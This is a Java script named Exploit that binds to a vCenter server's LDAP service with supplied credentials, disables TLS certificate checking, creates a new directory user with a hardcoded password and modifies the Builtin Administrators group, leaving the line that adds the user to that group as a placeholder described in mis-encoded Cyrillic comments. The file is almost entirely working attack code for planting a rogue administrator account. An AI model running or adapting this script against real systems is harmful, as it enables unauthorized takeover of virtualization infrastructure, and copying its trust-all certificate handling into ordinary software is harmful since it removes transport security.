import javax.naming.*;
import javax.naming.directory.*;
import javax.net.ssl.*;
import java.util.Hashtable;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;

public class Exploit {

    public static void main(String[] args) throws Exception {

        if (args.length != 4) {
            System.out.println("usage: java Exploit <VCENTER_IP> <BIND_USER> <BIND_PASS> <NEW_USERNAME>");
            return;
        }

        String ip = args[0];
        String bindUser = args[1];
        String bindPass = args[2];
        String newUser = args[3];

        // Ignore TLS
        TrustManager[] trustAllCerts = new TrustManager[]{
            new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() { return null; }
                public void checkClientTrusted(X509Certificate[] c, String a) {}
                public void checkServerTrusted(X509Certificate[] c, String a) {}
            }
        };

        SSLContext sc = SSLContext.getInstance("TLS");
        sc.init(null, trustAllCerts, new SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

        Hashtable<String,String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL, "ldaps://" + ip + ":636");
        env.put("java.naming.ldap.factory.socket", "javax.net.ssl.SSLSocketFactory");
        env.put(Context.SECURITY_AUTHENTICATION, "simple");
        env.put(Context.SECURITY_PRINCIPAL, bindUser);
        env.put(Context.SECURITY_CREDENTIALS, bindPass);

        DirContext ctx = null;

        // 1. BIND
        try {
            ctx = new InitialDirContext(env);
            System.out.println("[+] BIND OK");
        } catch (AuthenticationException e) {
            System.out.println("[!] INVALID CREDENTIALS (expected)");
            return;
        } catch (Exception e) {
            System.out.println("[!] Bind error");
            e.printStackTrace();
            return;
        }

        // 2. ADD USER
        String dn = "cn=" + newUser + ",cn=Users,dc=vsphere,dc=local";

        Attributes attrs = new BasicAttributes(true);
        Attribute oc = new BasicAttribute("objectClass");
        oc.add("top");
        oc.add("person");
        oc.add("organizationalPerson");
        oc.add("user");
        attrs.put(oc);

        // -----------------------------
        // üëâ –¢–£–¢ –¢—ã –≤—Å—Ç–∞–≤–ª—è–µ—à—å –ù–£–ñ–ù–´–ï –∞—Ç—Ä–∏–±—É—Ç—ã
        // -----------------------------
        attrs.put("sAMAccountName", newUser);
        attrs.put("userPassword", "Password4293!!!");

        try {
            ctx.createSubcontext(dn, attrs);
            System.out.println("[+] USER ADD OK");
        } catch (NameAlreadyBoundException e) {
            System.out.println("[!] USER ALREADY EXISTS");
        } catch (Exception e) {
            System.out.println("[!] ADD FAILED");
            e.printStackTrace();
        }

        // 3. MODIFY GROUP
        try {
            ModificationItem[] mods = new ModificationItem[]{
                // -----------------------------
                // üëâ –¢–£–¢ –¢—ã –≤—Å—Ç–∞–≤–ª—è–µ—à—å 1 —Å—Ç—Ä–æ–∫—É:
                // new ModificationItem(DirContext.ADD_ATTRIBUTE, new BasicAttribute("member", dn))
                // -----------------------------
            };

            ctx.modifyAttributes("cn=Administrators,cn=Builtin,dc=vsphere,dc=local", mods);
            System.out.println("[+] MOD OK");
        } catch (Exception e) {
            System.out.println("[!] MOD FAILED");
            e.printStackTrace();
        }

        ctx.close();
        System.out.println("[+] DONE");
    }
}
